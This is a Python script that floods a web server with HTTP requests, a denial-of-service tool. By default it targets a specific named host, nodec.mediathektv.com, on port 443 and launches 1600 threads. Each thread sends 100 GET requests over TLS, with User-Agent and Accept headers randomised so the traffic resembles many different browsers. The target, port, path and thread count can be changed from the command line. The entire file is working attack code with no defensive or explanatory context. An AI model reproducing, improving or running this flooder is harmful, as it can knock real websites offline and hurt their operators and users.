import random
import socket
import ssl
import datetime
import threading
import sys

# Server configuration
ip = "nodec.mediathektv.com"
port = 443
path = "/"
threads = 1600

# Update configuration from command-line arguments, if provided
for n, args in enumerate(sys.argv):
    ip = str(sys.argv[1])
    port = int(sys.argv[2])
    path = str(sys.argv[3])
    threads = int(sys.argv[4])

Choice = random.choice
Intn = random.randint

acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
]

def getuseragent():
    platform = Choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os = Choice(['68K', 'PPC', 'Intel Mac OS X'])
    elif platform == 'Windows':
        os = Choice(['Win3.11', 'Windows NT 10.0; Win64; x64'])
    elif platform == 'X11':
        os = Choice(['Linux i686', 'Linux x86_64'])
    
    browser = Choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(Intn(500, 599))
        version = f"{Intn(0, 99)}.0.{Intn(0, 9999)}.{Intn(0, 999)}"
        return f'Mozilla/5.0 ({os}) AppleWebKit/{webkit}.0 (KHTML, like Gecko) Chrome/{version} Safari/{webkit}'
    elif browser == 'firefox':
        gecko = f"{datetime.date.today().year}{Intn(1, 12):02}{Intn(1, 30):02}"
        version = f"{Intn(1, 72)}.0"
        return f'Mozilla/5.0 ({os}; rv:{version}) Gecko/{gecko} Firefox/{version}'
    else:
        return f'Mozilla/5.0 (compatible; MSIE {Intn(1, 99)}.0; {os}; Trident/{Intn(1, 99)}.0)'

def rqheader():
    connection = "Connection: Keep-alive\r\n"
    accept = Choice(acceptall)
    referer = f"Referer: https://{ip}\r\n"
    useragent = f"User-Agent: {getuseragent()}\r\n"
    header = connection + useragent + accept + referer + "\r\n"
    return header

def send_request():
    try:
        # Create a socket connection
        with socket.create_connection((ip, port)) as sock:
            # Wrap the socket if HTTPS (port 443)
            if port == 443:
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=ip)
            
            # Send 100 requests in a loop
            for _ in range(100):
                request = f"GET {path} HTTP/1.1\r\nHost: {ip}\r\n{rqheader()}"
                sock.sendall(request.encode())
    except Exception as e:
        print(f"Request error: {e}")

def thread_task():
    # Each thread will send 100 requests
    send_request()

# Start the threads
thread_list = []
for i in range(threads):
    thread = threading.Thread(target=thread_task)
    thread.start()
    thread_list.append(thread)

# Wait for all threads to complete
for thread in thread_list:
    thread.join()
